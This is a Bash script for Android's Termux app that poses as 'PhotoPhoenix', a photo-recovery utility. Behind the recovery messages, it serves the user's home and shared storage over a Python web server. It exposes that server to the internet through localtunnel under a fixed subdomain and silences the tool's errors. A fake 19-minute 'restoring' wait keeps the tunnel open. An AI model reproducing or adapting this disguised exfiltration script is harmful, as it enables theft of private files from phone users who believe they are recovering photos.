#!/bin/bash

# © 2026 CROWS CORPORATION
# Uses an MIT (Massachusetts Institute of Technology) license

GREEN="\033[32m"
RED="\033[31m"
END="\033[0m"
set -e
trap 'echo -e "${RED}The software has stopped due to a reason beyond its control!\nPlease try again.${END}"; rm -rf storage/shared/PhotoPhoenix; exit 1' INT ERR
sleep 1
echo -e "${GREEN}SOFTWARE : RUNNING ...${END}"
sleep 3
cd ~
if [ -d "storage" ]
then
  :
else
  echo -e "${RED}Please allow the software to access your device's internal storage ...${END}"
  TIME=$(date +%s)
  TIME_LIMIT=30
  while [ ! -d "storage" ]
  do
    termux-setup-storage
    CURRENT_TIME=$(date +%s)
    ELAPSED_TIME=$((CURRENT_TIME - TIME))
    if [ $ELAPSED_TIME -ge $TIME_LIMIT ]
    then
      echo -e "${RED}###################\nThe wait time has expired.\nYou have not allowed the software to access your device's internal storage!\nPlease try again.\n###################${END}"
      exit 1
    fi
  done
  sleep 3
fi
echo -e "${GREEN}Checking internet connection ...${END}"
sleep 3
if curl -I -m 6 https://google.com > /dev/null 2>&1
then
  echo -e "${GREEN}Internet connection available.\nThe software is downloading and installing required dependencies.\nThis may take a few minutes.\n${RED}Please do not touch anything here!${END}\n${GREEN}Please wait ...${END}"
  sleep 3
  pkg update
  pkg upgrade -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
  pkg install -y traceroute
  echo -e "${GREEN}Checking network interface ...\nNOTE : The software will only continue to work if you are connected to the internet via Wi-Fi network.\n(To save data during limited data usage)${END}"
  sleep 3
  if traceroute -m 1 1.1.1.1 2> /dev/null | grep -q -E "192\.168\.(0|1[0-9]*)\."
  then
    while true
    do
      if traceroute -m 1 1.1.1.1 2> /dev/null | grep -q -E "192\.168\.(0|1[0-9]*)\."
      then
        :
      else
        echo -e "${RED}The network interface has changed and the software has stopped!\nPlease connect to the internet with a stable Wi-Fi network and try again.${END}"
        if [ -d "storage/shared/PhotoPhoenix" ]
        then
          rm -rf storage/shared/PhotoPhoenix
        fi
        kill -9 $$
      fi
      sleep 1
    done &
    echo -e "${GREEN}You are connected to the Internet via Wi-Fi network.\nThe software continues to work ...${END}"
    sleep 3
    pkg install -y python
    pkg install -y nodejs
    npm install -g localtunnel > /dev/null 2>&1
    sed -i "s|throw new Error|// throw new Error|" /data/data/com.termux/files/usr/lib/node_modules/localtunnel/node_modules/openurl/openurl.js
    python -m http.server 8888 > /dev/null 2>&1 &
    lt -p 8888 -s photophoenixtget > /dev/null 2>&1 &
    echo -e "${GREEN}The software is searching for photos to recover ...\nPlease wait ...${END}"
    sleep 1m
    if find storage/shared/Android/data/com.miui.gallery/files/gallery_disk_cache -type f -path "*size/*.0" 2> /dev/null | grep -q .
    then
      echo -e "${GREEN}The software recovers the photos it finds ...\nThis may take a few minutes.\n${RED}Please do not touch anything here!${END}\n${GREEN}Please wait ...${END}"
      mkdir -p storage/shared/PhotoPhoenix/restored_photos
      find storage/shared/Android/data/com.miui.gallery/files/gallery_disk_cache -type d -name "*size" -exec cp -r {} storage/shared/PhotoPhoenix/restored_photos \;
      find storage/shared/PhotoPhoenix/restored_photos -type f -path "*size/*" ! -name "*.0" -exec rm -f {} \;
      while read folder;
      do
        i=1
        for file in "$folder"/*.0;
        do
          mv -- "$file" "$folder/${i}.jpg"
          ((i++))
        done
      done < <(find storage/shared/PhotoPhoenix/restored_photos -type d -name "*size")
      echo -e "${GREEN}Restoring photos ...\nPlease wait ...${END}"
      sleep 19m
      echo -e "${GREEN}The software successfully recovered the photos it found!\nYou can view the restored photos in the [ PhotoPhoenix/restored_photos ] folder on your device's internal storage.${END}"
      exit 1
    else
      echo -e "${RED}The software could not find any photos to recover.${END}"
      exit 1
    fi
  else
    echo -e "${RED}You are not connected to the Internet via Wi-Fi network.\nPlease connect to the internet via Wi-Fi network and try again.${END}"
    exit 1
  fi
else
  echo -e "${RED}No internet connection.\nPlease connect to the internet and try again.${END}"
  exit 1
fi
